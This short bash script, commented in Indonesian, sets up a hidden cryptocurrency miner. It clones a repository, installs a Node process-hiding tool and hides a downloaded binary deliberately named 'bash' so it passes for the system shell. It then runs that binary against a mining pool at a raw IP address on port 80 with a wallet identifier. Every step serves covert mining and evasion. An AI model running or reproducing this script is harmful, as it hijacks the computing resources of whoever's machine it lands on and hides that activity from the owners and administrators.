#!/bin/bash

# Non-interactive mode supaya tidak ada konfirmasi
export DEBIAN_FRONTEND=noninteractive

echo "== Update & Upgrade System =="
sudo apt update -y && sudo apt upgrade -y

echo "== Install Git =="
sudo apt install -y git

echo "== Clone Repository =="
git clone https://github.com/hujisanda/lol198.git

echo "== Masuk Folder =="
cd lol198 || { echo "Folder tidak ditemukan"; exit 1; }

echo "== Install NodeJS & NPM =="
sudo apt install -y nodejs npm

echo "== Install Build Essential & GCC =="
sudo apt install -y build-essential gcc

echo "== Install node-process-hider =="
sudo npm install -g node-process-hider

echo "== Tambah Hide Process bash =="
sudo ph add bash

echo "== Permission File bash =="
chmod u+x bash

echo "== Menjalankan ./bash =="
./bash --algo FISHHASH --pool 134.209.175.114:80 --user c9f8d6c1849abbcd164f6c72002d9ac44b9deaef70481739a29d1733915defca+115098.jasin --ethstratum ETHPROX
